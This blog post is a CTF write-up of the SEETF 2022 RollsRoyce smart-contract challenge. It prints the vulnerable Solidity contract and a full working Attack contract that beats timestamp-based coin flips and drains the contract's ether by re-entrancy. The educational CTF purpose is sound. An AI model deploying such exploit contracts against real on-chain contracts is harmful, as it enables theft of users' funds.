<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>SEETF 2022 Smart Contract Challenge - RollsRoyce | Quentin</title><meta name=keywords content="ctf,seetf-2022,blockchain,smart-contracts,re-entrancy,pseudorandomness"><meta name=description content="RollsRoyce Challenge Description This was a smart-contract challenge that was part of the recent SEETF 2022 hosted by the Social Engineering Experts. I played this together under 3_Blind_Mice, a random team made together with @chuayupeng and ethon for pure fun and memes.
Like all the other smart-contract challenges in this CTF, a vulnerable contract was deployed onto SEETF&rsquo;s very own private blockchain network.
Solving this challenge required exploiting 2 vulnerabilities, a pseudorandomness vulnerability that leveraged on block."><meta name=author content="Quentin Khoo"><link rel=canonical href=https://quentinkhoo.github.io/posts/seetf-2022-smart-contract-rolls-royce/><link crossorigin=anonymous href=/assets/css/stylesheet.f2b53faad468649af26eb3bb7ab2f3fcfea64b0f5c279ead82e5abd871243ce8.css integrity="sha256-8rU/qtRoZJrybrO7erLz/P6mSw9cJ56tguWr2HEkPOg=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://quentinkhoo.github.io/images/peepoclap.gif><link rel=icon type=image/png sizes=16x16 href=https://quentinkhoo.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://quentinkhoo.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://quentinkhoo.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://quentinkhoo.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="SEETF 2022 Smart Contract Challenge - RollsRoyce"><meta property="og:description" content="RollsRoyce Challenge Description This was a smart-contract challenge that was part of the recent SEETF 2022 hosted by the Social Engineering Experts. I played this together under 3_Blind_Mice, a random team made together with @chuayupeng and ethon for pure fun and memes.
Like all the other smart-contract challenges in this CTF, a vulnerable contract was deployed onto SEETF&rsquo;s very own private blockchain network.
Solving this challenge required exploiting 2 vulnerabilities, a pseudorandomness vulnerability that leveraged on block."><meta property="og:type" content="article"><meta property="og:url" content="https://quentinkhoo.github.io/posts/seetf-2022-smart-contract-rolls-royce/"><meta property="og:image" content="https://quentinkhoo.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-07-03T15:54:11+08:00"><meta property="article:modified_time" content="2022-07-03T15:54:11+08:00"><meta property="og:site_name" content="Quentin"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://quentinkhoo.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="SEETF 2022 Smart Contract Challenge - RollsRoyce"><meta name=twitter:description content="RollsRoyce Challenge Description This was a smart-contract challenge that was part of the recent SEETF 2022 hosted by the Social Engineering Experts. I played this together under 3_Blind_Mice, a random team made together with @chuayupeng and ethon for pure fun and memes.
Like all the other smart-contract challenges in this CTF, a vulnerable contract was deployed onto SEETF&rsquo;s very own private blockchain network.
Solving this challenge required exploiting 2 vulnerabilities, a pseudorandomness vulnerability that leveraged on block."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://quentinkhoo.github.io/posts/"},{"@type":"ListItem","position":3,"name":"SEETF 2022 Smart Contract Challenge - RollsRoyce","item":"https://quentinkhoo.github.io/posts/seetf-2022-smart-contract-rolls-royce/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SEETF 2022 Smart Contract Challenge - RollsRoyce","name":"SEETF 2022 Smart Contract Challenge - RollsRoyce","description":"RollsRoyce Challenge Description This was a smart-contract challenge that was part of the recent SEETF 2022 hosted by the Social Engineering Experts. I played this together under 3_Blind_Mice, a random team made together with @chuayupeng and ethon for pure fun and memes.\nLike all the other smart-contract challenges in this CTF, a vulnerable contract was deployed onto SEETF\u0026rsquo;s very own private blockchain network.\nSolving this challenge required exploiting 2 vulnerabilities, a pseudorandomness vulnerability that leveraged on block.","keywords":["ctf","seetf-2022","blockchain","smart-contracts","re-entrancy","pseudorandomness"],"articleBody":"RollsRoyce Challenge Description This was a smart-contract challenge that was part of the recent SEETF 2022 hosted by the Social Engineering Experts. I played this together under 3_Blind_Mice, a random team made together with @chuayupeng and ethon for pure fun and memes.\nLike all the other smart-contract challenges in this CTF, a vulnerable contract was deployed onto SEETF’s very own private blockchain network.\nSolving this challenge required exploiting 2 vulnerabilities, a pseudorandomness vulnerability that leveraged on block.timestamp being used as a random generator, and a re-entrancy attack.\nContract Code We are given this RollsRoyce.sol contract as shown below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract RollsRoyce { enum CoinFlipOption { HEAD, TAIL } address private bettingHouseOwner; address public currentPlayer; CoinFlipOption userGuess; mapping(address =\u003e uint) playerConsecutiveWins; mapping(address =\u003e bool) claimedPrizeMoney; mapping(address =\u003e uint) playerPool; constructor() payable { bettingHouseOwner = msg.sender; } receive() external payable {} function guess(CoinFlipOption _guess) external payable { require(currentPlayer == address(0), \"There is already a player\"); require(msg.value == 1 ether, \"To play it needs to be 1 ether\"); currentPlayer = msg.sender; depositFunds(msg.sender); userGuess = _guess; } function revealResults() external { require( currentPlayer == msg.sender, \"Only the player can reveal the results\" ); CoinFlipOption winningOption = flipCoin(); if (userGuess == winningOption) { playerConsecutiveWins[currentPlayer] = playerConsecutiveWins[currentPlayer] + 1; } else { playerConsecutiveWins[currentPlayer] = 0; } currentPlayer = address(0); } function flipCoin() private view returns (CoinFlipOption) { return CoinFlipOption( uint( keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6)) ) % 2 ); } function viewWins(address _addr) public view returns (uint) { return playerConsecutiveWins[_addr]; } function depositFunds(address _to) internal { playerPool[_to] += msg.value; } function sendValue(address payable recipient, uint256 amount) internal { require( address(this).balance \u003e= amount, \"Address: insufficient balance\" ); (bool success, ) = recipient.call{value: amount}(\"\"); } function withdrawPrizeMoney(address _to) public payable { require( msg.sender == _to, \"Only the player can withdraw the prize money\" ); require( playerConsecutiveWins[_to] \u003e= 3, \"You need to win 3 or more consecutive games to claim the prize money\" ); if (playerConsecutiveWins[_to] \u003e= 3) { uint prizeMoney = playerPool[_to]; playerPool[_to] = 0; sendValue(payable(_to), prizeMoney); } } function withdrawFirstWinPrizeMoneyBonus() external { require( !claimedPrizeMoney[msg.sender], \"You have already claimed the first win bonus\" ); playerPool[msg.sender] += 1 ether; withdrawPrizeMoney(msg.sender); claimedPrizeMoney[msg.sender] = true; } function isSolved() public view returns (bool) { // Return true if the game is solved return address(this).balance == 0; } } Contract Functions Based on the source code of the contract itself, we can learn a couple of things\nThe contract is basically a coin flipping game. The guess() function essentially allows us to enter the game and make a guess, making the address who called this function the currentPlayer. The revealResults() function makes a flipCoin() and uses that as the comparison against the guess(). If you win a coin flip 3 times consecutively, you can claim claim all the ether you’ve won plus 1 additional ether through WithdrawFirstWinPrizeMoneyBonus() This additional 1 ether bonus only applies on your first win. We solve the problem when we drain all the funds from the contract itself. We can determine the amount of funds in the contract by running web3.eth.getBalance(contractAddress), which tells us that there’s 5 ether in the contract itself when we deploy the contract Exploit 1 - Predictable Block Timestamp Let’s take a look at how the results of the flipCoin() function gets generated\n1 2 3 4 5 6 7 8 function flipCoin() private view returns (CoinFlipOption) { return CoinFlipOption( uint( keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6)) ) % 2 ); } keccak256(abi.encodePacked(block.timestamp ^ 0x1F2Df76A6)) – According to the documentation, this computes the hash of some structured data. What is interesting to us is the use of block.timestamp over here, which according to the solidity documentation, is essentially the current block’s timestamp in seconds –\u003e in other words, a deterministic value.\nSo I guess the question is, how do we exploit this idea? When a transaction is made, it gets stored onto a block and it is this particular block’s timestamp that we are interested in.\nIn order to exploit this, we first got to call the guess() function along with the revealResults() function in the same transaction, so something like this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 contract Attack { RollsRoyce victim; address owner; constructor(address payable _addr) public payable { owner = msg.sender; victim = RollsRoyce(_addr); } function flipCoin() private view returns (RollsRoyce.CoinFlipOption) { return RollsRoyce.CoinFlipOption( uint256( keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6)) ) % 2 ); } function win() public payable { require(address(this).balance \u003e= 1 ether, \"Send contract some ether\"); RollsRoyce.CoinFlipOption result = flipCoin(); victim.guess{value: 1 ether}(result); victim.revealResults(); } } Essentially, the win() function basically tries to call guess() and revealResults() in the same transaction, therefore making block.timestamp a deterministic value which allows us to predict the result of the flipCoin() function and making an accurate guess().\nWe can then deploy this Attack contract and transfer some ether to it. We can verify that our win() function is indeed working as intended by calling the function multiple times and verifying against the viewWins() function in the deployed RollsRoyce contract as shown below\nGreat! We have a surefireway to win the coin flips now by exploiting the usage of a predictable block.timestamp!\nExploit 2 - Re-entrancy Attack A classic attack when it comes to exploiting smart contracts - a re-entrancy attack in short basically exploits the idea of a victim contract blindly makes an external call to a malicious contract. In this challenge, the re-entrancy attack was exploitable through the withdrawFirstWinPrizeMoneyBonus() function as shown below:\n1 2 3 4 5 6 7 8 9 function withdrawFirstWinPrizeMoneyBonus() external { require( !claimedPrizeMoney[msg.sender], \"You have already claimed the first win bonus\" ); playerPool[msg.sender] += 1 ether; withdrawPrizeMoney(msg.sender); claimedPrizeMoney[msg.sender] = true; } When a player calls the withdrawFirstWinPrizeMoneyBonus() after winning the game, the contract will essentially add an additional 1 ether to the player’s prize pool via playerPool[msg.sender] += 1 ether. The thing is, this function can only be called once by the player as seen in the first statement require(!claimedPrizeMoney[msg.sender]. claimedPrizeMoney[msg.sender] gets set to true at the end of the function in the last line, after withdrawPrizeMoney().\nNow let’s look at what withdrawPrizeMoney() does:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 function sendValue(address payable recipient, uint256 amount) internal { require( address(this).balance \u003e= amount, \"Address: insufficient balance\" ); (bool success, ) = recipient.call{value: amount}(\"\"); } function withdrawPrizeMoney(address _to) public payable { require( msg.sender == _to, \"Only the player can withdraw the prize money\" ); require( playerConsecutiveWins[_to] \u003e= 3, \"You need to win 3 or more consecutive games to claim the prize money\" ); if (playerConsecutiveWins[_to] \u003e= 3) { uint256 prizeMoney = playerPool[_to]; playerPool[_to] = 0; sendValue(payable(_to), prizeMoney); } } Essentially, withdrawPrizeMoney() simply sends the player calling the function the amount of ether as stored in playerPool[recipient], after checking that the player has won at least 3 or more times consecutively.\nSo where is the vulnerability and how can it be exploited?\nWhen a contract sends another address some ether like seen in the sendValue(address payable recipient, uint256 amount) function, the contract is actually making a call to the victim’s receive() function. In essence, we can implement the receive() function in a way such that it makes a recursive call back to a victim contract’s exploitable function.\nIn this case, the exploitable function is the withdrawFirstWinPrizeMoneyBonus(). Lets take a look at the function calls being made when a player calls the withdrawFirstWinPrizeMoneyBonus() function (or at least what’s important to take note of):\nwithdrawFirstWinPrizeMoneyBonus() –\u003e `require(!claimedPrizeMoney[msg.sender]) –\u003e playerPool[msg.sender] += 1 ether; –\u003e withdrawPrizeMoney(msg.sender); –\u003e sendValue(payable(_to), prizeMoney); –\u003e claimedPrizeMoney[msg.sender] = true; If we can somehow re-make the call to the withdrawFirstWinPrizeMoneyBonus() function before claimedPrizeMoney[msg.sender] gets set to true, we can essentially keep recursively calling that function until the contract has no funds, which is the aim of this challenge ultimately. In other words, we want to make a function call back to the withdrawFirstWinPrizeMoneyBonus() function right after receiving ether from the victim contract, something like below:\nwithdrawFirstWinPrizeMoneyBonus() –\u003e require(!claimedPrizeMoney[msg.sender]) –\u003e playerPool[msg.sender] += 1 ether; –\u003e withdrawPrizeMoney(msg.sender); –\u003e sendValue(payable(_to), prizeMoney); –\u003e withdrawFirstWinPrizeMoneyBonus() –\u003e require(!claimedPrizeMoney[msg.sender]) –\u003e playerPool[msg.sender] += 1 ether; –\u003e withdrawPrizeMoney(msg.sender); –\u003e sendValue(payable(_to), prizeMoney); –\u003e ……. claimedPrizeMoney[msg.sender] = true; We can achieve this by simply extending our Attack contract and implementing our own malicious receive() function as shown below:\n1 2 3 4 5 receive() external payable { if (victim.viewWins(address(this)) \u003e= 3 \u0026\u0026 address(victim).balance \u003e 0) { victim.withdrawFirstWinPrizeMoneyBonus(); } } Note that we also want to check that we only trigger the vulnerable re-entrancy function if we have already won the game, and we only wish to keep drawing the funds if there are even funds to draw.\nWrapping it all up like a Sushi Roll Alright, now that we understand what we need to do, let’s implement the full exploit contract!\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 contract Attack { RollsRoyce victim; address owner; constructor(address payable _addr) public payable { owner = msg.sender; victim = RollsRoyce(_addr); } function flipCoin() private view returns (RollsRoyce.CoinFlipOption) { return RollsRoyce.CoinFlipOption( uint( keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6)) ) % 2 ); } function win() public payable { require(address(this).balance \u003e= 1 ether, \"Send contract some ether\"); RollsRoyce.CoinFlipOption result = flipCoin(); victim.guess{value: 1 ether}(result); victim.revealResults(); } function pwnContract() public payable { for (uint i = 0; i \u003c 3; i++) { win(); } victim.withdrawFirstWinPrizeMoneyBonus(); } receive() external payable { if (victim.viewWins(address(this)) \u003e= 3 \u0026\u0026 address(victim).balance \u003e 0) { victim.withdrawFirstWinPrizeMoneyBonus(); } } function getBalance() public view returns (uint) { return address(this).balance; } function withdrawBalance(uint amount) public { require(msg.sender == owner, \"You not owner!\"); require(address(this).balance \u003e= amount, \"This contract has no more funds!\"); (bool success, ) = msg.sender.call{value: amount}(\"\"); } } For simplicity, everything can be done from within a single function call pwnContract() itself, which includes winning the coin flip 3 times consecutively, and also making the call to the exploitable withdrawFirstWinPrizeMoneyBonus() function. We simply just have to call the pwnContract() function, transfer 3 ether to it and then, we’d solve the challenge.\nTo also make things more realistic, we can also implement a withdrawBalance() function to withdraw funds from the contract (otherwise the funds are simply stuck in the contract and lost forever once deployed!)\nOnce we call pwnContract(), we can see that challenge has been solved and isSolved() has been set to true!\nNow let’s go grab our flag :)\nSEE{R4nd0m_R0yC3_6390bc0863295e58c2922f4fca50dab9}\n","wordCount":"1875","inLanguage":"en","datePublished":"2022-07-03T15:54:11+08:00","dateModified":"2022-07-03T15:54:11+08:00","author":{"@type":"Person","name":"Quentin Khoo"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://quentinkhoo.github.io/posts/seetf-2022-smart-contract-rolls-royce/"},"publisher":{"@type":"Organization","name":"Quentin","logo":{"@type":"ImageObject","url":"https://quentinkhoo.github.io/images/peepoclap.gif"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://quentinkhoo.github.io accesskey=h title="Home (Alt + H)"><img src=https://quentinkhoo.github.io/images/peepoclap.gif alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://quentinkhoo.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://quentinkhoo.github.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://quentinkhoo.github.io/about/ title=Whoami><span>Whoami</span></a></li><li><a href=https://quentinkhoo.github.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://quentinkhoo.github.io>Home</a>&nbsp;»&nbsp;<a href=https://quentinkhoo.github.io/posts/>Posts</a></div><h1 class=post-title>SEETF 2022 Smart Contract Challenge - RollsRoyce</h1><div class=post-meta><span title='2022-07-03 15:54:11 +0800 +0800'>July 3, 2022</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;1875 words&nbsp;·&nbsp;Quentin Khoo&nbsp;|&nbsp;<a href=https://github.com/quentinkhoo/quentinkhoo.github.io/content/posts/SEETF-2022-smart-contract-rolls-royce.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#rollsroyce-challenge-description>RollsRoyce Challenge Description</a><ul><li><a href=#contract-code>Contract Code</a></li><li><a href=#contract-functions>Contract Functions</a></li></ul></li><li><a href=#exploit-1---predictable-block-timestamp>Exploit 1 - Predictable Block Timestamp</a></li><li><a href=#exploit-2---re-entrancy-attack>Exploit 2 - Re-entrancy Attack</a></li><li><a href=#wrapping-it-all-up-like-a-sushi-roll>Wrapping it all up like a Sushi Roll</a></li></ul></nav></div></details></div><div class=post-content><h2 id=rollsroyce-challenge-description>RollsRoyce Challenge Description<a hidden class=anchor aria-hidden=true href=#rollsroyce-challenge-description>#</a></h2><p>This was a smart-contract challenge that was part of the recent <a href=https://ctftime.org/event/1543/>SEETF 2022</a> hosted by the <a href=https://seetf.sg/seetf/>Social Engineering Experts</a>. I played this together under <a href=https://ctftime.org/team/190705>3_Blind_Mice</a>, a random team made together with <a href=https://github.com/chuayupeng>@chuayupeng</a> and <a href=https://github.com/gnosis-agora>ethon</a> for pure fun and memes.</p><p>Like all the other smart-contract challenges in this CTF, a vulnerable contract was deployed onto <a href=https://github.com/Social-Engineering-Experts/ETH-Guide>SEETF&rsquo;s very own private blockchain network</a>.</p><p>Solving this challenge required exploiting 2 vulnerabilities, a pseudorandomness vulnerability that leveraged on <code>block.timestamp</code> being used as a random generator, and a <a href=https://hackernoon.com/hack-solidity-reentrancy-attack>re-entrancy attack</a>.</p><h3 id=contract-code>Contract Code<a hidden class=anchor aria-hidden=true href=#contract-code>#</a></h3><p>We are given this <code>RollsRoyce.sol</code> contract as shown below:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>RollsRoyce</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>enum</span> <span class=nc>CoinFlipOption</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>HEAD</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>TAIL</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=k>private</span> <span class=n>bettingHouseOwner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=k>public</span> <span class=n>currentPlayer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>CoinFlipOption</span> <span class=n>userGuess</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint</span><span class=p>)</span> <span class=n>playerConsecutiveWins</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>bool</span><span class=p>)</span> <span class=n>claimedPrizeMoney</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint</span><span class=p>)</span> <span class=n>playerPool</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>()</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>bettingHouseOwner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>receive</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>guess</span><span class=p>(</span><span class=n>CoinFlipOption</span> <span class=n>_guess</span><span class=p>)</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>currentPlayer</span> <span class=o>==</span> <span class=kt>address</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=s>&#34;There is already a player&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span> <span class=o>==</span> <span class=mi>1</span> <span class=kc>ether</span><span class=p>,</span> <span class=s>&#34;To play it needs to be 1 ether&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>currentPlayer</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>depositFunds</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>userGuess</span> <span class=o>=</span> <span class=n>_guess</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>revealResults</span><span class=p>()</span> <span class=k>external</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>currentPlayer</span> <span class=o>==</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;Only the player can reveal the results&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>CoinFlipOption</span> <span class=n>winningOption</span> <span class=o>=</span> <span class=n>flipCoin</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>userGuess</span> <span class=o>==</span> <span class=n>winningOption</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>playerConsecutiveWins</span><span class=p>[</span><span class=n>currentPlayer</span><span class=p>]</span> <span class=o>=</span>
</span></span><span class=line><span class=cl>                <span class=n>playerConsecutiveWins</span><span class=p>[</span><span class=n>currentPlayer</span><span class=p>]</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>playerConsecutiveWins</span><span class=p>[</span><span class=n>currentPlayer</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>currentPlayer</span> <span class=o>=</span> <span class=kt>address</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>flipCoin</span><span class=p>()</span> <span class=k>private</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=n>CoinFlipOption</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>            <span class=n>CoinFlipOption</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=kt>uint</span><span class=p>(</span>
